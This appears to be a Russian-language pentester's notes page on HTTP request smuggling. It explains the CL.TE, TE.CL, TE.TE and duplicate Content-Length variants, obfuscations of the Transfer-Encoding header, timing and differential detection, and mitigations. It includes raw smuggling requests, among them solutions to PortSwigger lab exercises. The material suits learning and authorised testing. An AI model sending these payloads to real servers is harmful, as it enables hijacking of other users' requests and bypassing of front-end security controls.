# HTTP Smuggling

## About

Атака, при которой фронт (front-end proxy, HTTP-enabled firewall или цепочка серверов с различной конфигурацией) воспринимает запрос как один (например, он открывает сокет с бэкенд сервером и в рамках одного сокета шлет запросы пользователей), а на бэке он распадается на два (бэкенд по специальным заголовкам понимает, где конец одного запроса и начало следующего).

![](../../.gitbook/assets/изображение.png)

Делается это с помощью заголовков **Content-Length (CL)** или **Transfer-Encoding (TE)**.

## Как это происходит?

Спецификация HTTP позволяет указать серверу, что запрос завершен, двумя способами. Использовать **Content-Length** или **Transfer-Encoding: chunked**.

**Content-Length** указывает сколько байтов тело запроса. Тогда как **Transfer-Encodiing: chunked** указывает, что тело запроса будет отправлено кусками, разделенными последовательностями новой строки, причем каждому фрагменту предшествует его размер в байтах (hexadecimal). Тело запроса заканчивается фрагментом нулевой длины.

Спецификация HTTP указывает, что при наличии CL и TE заголовков, **CL следует игнорировать**. Однако, по разным причинам при отправке обоих этих заголовков в одном запросе может возникнуть конфликты:

* Некоторые HTTP сервера не поддерживают TE заголовок
* Другие могут его игнорировать при использовании некоторых кодирований/обфускации

### Направления проверок

* CL.TE: фронт использует CL, бэк — TE
* TE.CL: фронт использует TE, бэк — CL
* TE.TE: и фронт и бэк используют TE, но они по разному реагируют на обфускацию заголовков

### CL.TE

Пример запроса

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

В PortSwigger есть лаба: [https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

### TE.CL

Пример запроса

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

В PortSwigger есть лаба: [https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)\
Мое решение: [https://gist.github.com/IkeMurami/45abe13216559cfb89d3b1397a53fd02](https://gist.github.com/IkeMurami/45abe13216559cfb89d3b1397a53fd02)

### TE.TE

Как указано выше: оба сервера поддерживают заголовок TE, но если он обфусцирован немного, могут на него среагировать по разному. Наша задача: найти такую обфускацию, при которой один сервер обработает заголовок, другой — проигнорирует. Примеры обфускации заголовка:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

PortSwigger Lab: [https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

Решение:

```
POST / HTTP/1.1
Host: 0a88004804c128e6c0680d67009f0082.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### 2xCL

Использование двух `Content-Length` — где-то может взяться первый `Content-Length`, а на другом сервере — второй

```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: example.com
…
```

Тогда с первого вернется: UNKNOWN HTTP Method GPOST (как детект)

Подробнее: [https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

### Еще трюк

I found another way to do HTTP smuggling, you can use T-E: chunKed\
K is the Kelvin symbol (%E2%84%AA) If the header is converted to lowercase, you get 'chunked' in ascii, if it's converted to uppercase it will stay the same (invalid)

## Как детектировать

### Timing Techniques

#### CL.TE Timing Detect

Отправляем незакрытый TE chunk — бэк сервер отваливается по таймауту

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

#### TE.CL Timing Detect

Фронт сервер получает запрос двумя чанками, собирает его и отправляет на бэк сервер. Бэк смотрит на CL и ждет остатки данных (которых не будет) => это вызывает значительные временные задержки

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### Differential responses

#### CL.TE

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Суть в том, что на стороне бэкенд сервер, будет рассматривать этот запрос как:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Если получим 404, сервер уязвим к этому типу атаки

Еще пример из [лабы](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses):

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

TODO: почему это так работает — хз. Надо поднимать свою лабу и дебажить..

#### TE.CL

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

Если атака успешна, то на стороне бэкенд-сервера запрос пересоберется в:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Если получим 404 — сервер уязвим к этому типу атаки

Пример запроса:

```
POST /search HTTP/1.1
Host: 0a3f0008040cb821c064af6f00200096.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Notes

При попытке проэксплуатировать этот тип уязвимости, следует помнить о некоторых важных соображениях:

* Запросы с нормальным запросом и с пэйлоадом должны быть отправлены с разных сетевых подключений. Отправка обоих запросов через одно и то же соединение не докажет, что уязвимость существует
* Запросы с нормальным запросом и с пэйлоадом должны использовать одни и те же имена URL и параметров, насколько это возможно. Тк балансер (фронт сервер) разные URL может отправить на разные бэкенд сервера. Использование одного набора URL и параметров повысит вероятность успешной атаки.
* Так как можем попасть в гонку с другими запросами других пользователей, может потребоваться несколько раз провести отправку нормальных и запросов с пэйлоадами для подтверждения уязвимости.
* При подтверждении уязвимости надо стараться не затрагивать других пользователей.

### Tools

Smuggler extension for Burp: [https://kalilinuxtutorials.com/http-request-smuggler-extension-burp-suite/](https://kalilinuxtutorials.com/http-request-smuggler-extension-burp-suite/)

Python script: [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)

## TODO

Сделать лабу на HTTP Smuggling

## Mitigation

* Убедитесь, что одно и то же серверное программное обеспечение используется как на внешнем, так и на внутреннем серверах, чтобы они синхронизировались, какой заголовок они будут использовать, чтобы предотвратить конфликты (либо **Content-Length**, либо **Transfer Encoding: chunked**).&#x20;
* Некоторые провайдеры WAF уже имеют встроенные средства защиты при обнаружении аномальных запросов. Уточните у своего провайдера, есть ли у него поддержка для этого.&#x20;
* Отключите повторное использование внутренних соединений, чтобы каждый внутренний запрос отправлялся через отдельное сетевое соединение.

## Papers

Статьи: \
[https://habr.com/ru/post/468489/](https://habr.com/ru/post/468489/)\
[https://blog.deteact.com/gunicorn-http-request-smuggling/](https://blog.deteact.com/gunicorn-http-request-smuggling/)\
[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)\
[https://www.rcesecurity.com/2020/11/Smuggling-an-un-exploitable-xss/](https://www.rcesecurity.com/2020/11/Smuggling-an-un-exploitable-xss/)

## Labs

HTTP Smuggling lab: здесь внутри и на сокетах и в разных конфигурациях и тп [https://github.com/ZeddYu/HTTP-Smuggling-Lab](https://github.com/ZeddYu/HTTP-Smuggling-Lab)

И норм материал к этому: [https://regilero.github.io/english/security/2019/10/17/security\_apache\_traffic\_server\_http\_smuggling/](https://regilero.github.io/english/security/2019/10/17/security\_apache\_traffic\_server\_http\_smuggling/)

Мое скрипт по решению этих лаб: [https://github.com/IkeMurami/zscanutils/blob/main/scripts/http\_request\_over\_sockets.py](https://github.com/IkeMurami/zscanutils/blob/main/scripts/http\_request\_over\_sockets.py)

